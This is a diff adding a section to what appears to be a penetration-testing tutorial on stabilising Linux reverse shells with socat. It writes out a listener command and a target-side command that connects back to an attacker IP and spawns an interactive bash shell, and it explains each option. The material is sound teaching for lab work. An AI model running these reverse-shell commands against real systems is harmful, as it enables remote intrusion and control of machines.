@@ -277,3 +277,31 @@ Regardless of the target, we use this command on our attacking machine to connec
 socat TCP:<TARGET-IP>:<TARGET-PORT> -  
 
 ---
+
+Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. This will only work when the target is Linux, but is significantly more stable. As mentioned earlier, socat is an incredibly versatile tool; however, the following technique is perhaps one of its most useful applications. Here is the new listener syntax:
+
+socat TCP-L:<port> FILE:`tty`,raw,echo=0
+
+Let's break this command down into its two parts. As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z, stty raw -echo; fg trick with a netcat shell -- with the added bonus of being immediately stable and hooking into a full tty.
+
+The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a precompiled socat binary(opens in new tab), which can then be executed as normal.
+
+The special command is as follows:
+
+socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+
+This is a handful, so let's break it down.
+
+The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  EXEC:"bash -li". We're also passing the arguments: pty, stderr, sigint, setsid and sane:  
+
+pty, allocates a pseudoterminal on the target -- part of the stabilisation process  
+stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)  
+sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell  
+setsid, creates the process in a new session  
+sane, stabilises the terminal, attempting to "normalise" it.  
+That's a lot to take in, so let's see it in action.  
+
+As normal, on the left we have a listener running on our local attacking machine, on the right we have a simulation of a compromised target, running with a non-interactive shell. Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left:  
+
+<img width="1247" height="173" alt="image" src="https://github.com/user-attachments/assets/154b5788-00df-4df0-8718-e46afd29c15a" />
+
